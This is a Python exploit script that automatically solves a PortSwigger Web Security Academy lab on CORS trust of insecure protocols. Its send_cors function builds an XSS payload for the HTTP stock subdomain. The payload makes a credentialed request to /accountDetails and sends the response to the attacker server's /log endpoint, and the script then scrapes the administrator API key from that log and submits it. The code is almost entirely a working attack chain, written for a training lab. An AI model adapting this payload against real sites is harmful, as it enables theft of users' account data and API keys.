# CORS vulnerability with trusted insecure protocols

# https://portswigger.net/web-security/cors/lab-breaking-https-attack

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def deliver_payload(s, url, payload, attacker):
	post_exploit_path = attacker
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r1 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r2 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path + post_exploit_data['responseFile'])
	return r2

def send_cors(s, url, attacker):
	stock_url = url.replace('https://', 'http://stock.')
	exploit_body = """<script>document.location=\"""" + stock_url + """/?productId=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','""" + url + """/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='""" + attacker + """/log?key='%2bthis.responseText; };%3c/script>&storeId=1"</script>"""
	r = deliver_payload(s, stock_url, exploit_body, attacker)
	time.sleep(2)
	return r

def get_api_key(s, attacker):
	log_path = attacker + '/log'
	r = s.get(log_path)
	search_string = re.search("apikey%22:%20%22(.*)%22,%20", r.text)
	if search_string:
		api_key = search_string.group(1)
		return api_key
	else:
		return False

def submit_api_key(s, url, api_key):
	print('[+] Trying to submit the API key to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": api_key}
	r = s.post(submit_path, data=submit_data)
	return r

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv
	else:
		print("[-] Didn't find exploit server on the home page <!>")
		sys.exit(1)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: CORS vulnerability with trusted insecure protocols')
	parser = argparse.ArgumentParser(description="[+] Lab: CORS vulnerability with trusted insecure protocols")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		exploit_srv = find_exploit_srv(r)
		attacker = urllib.parse.urlparse(exploit_srv).scheme + "://" + urllib.parse.urlparse(exploit_srv).netloc
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send a CORS attack to the victim...')
			r = send_cors(s, url, attacker)
			time.sleep(4)
			print("[+] Trying to retrieve the API Key in exploit server's logs...")
			for i in range(1,6):
				print('[+] Try#%s' % i)
				time.sleep(2)
				api_key = get_api_key(s, attacker)
				if api_key:
					print('[+] Found Administrator API Key:\t%s' % api_key)
					break
			time.sleep(2)
			if api_key:
				r = submit_api_key(s, url, api_key)
			else:
				print("\n[-] The payload didn't send expected request <!>")

			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
